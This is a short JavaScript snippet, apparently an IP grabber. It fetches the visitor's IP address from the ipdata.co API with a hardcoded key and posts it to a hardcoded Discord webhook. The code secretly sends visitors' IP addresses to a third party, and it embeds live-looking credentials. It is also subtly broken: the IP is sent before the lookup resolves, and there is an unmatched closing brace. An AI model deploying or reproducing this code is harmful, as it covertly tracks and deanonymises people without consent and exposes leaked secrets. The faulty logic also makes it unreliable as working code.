    var message;
    
    function json(url) {
  return fetch(url).then(res => res.json());
}

let apiKey = '8ccbee919241e35e27171bcd6485e1ba985fc78b2789d5bdd00262c1';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  message = data.ip;
});

  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/855010994963349504/7jaFAyZ8sIO0X4A_fWSrHHq85ALVGQffsP0F6ownrFMxgKwTU808G36cheJ7Vm2SdvCw ");

  request.setRequestHeader('Content-type', 'application/json');

  var params = {
    username: "ip ip ip",
    avatar_url: "",
    content: message
  }
   
  request.send(JSON.stringify(params));
}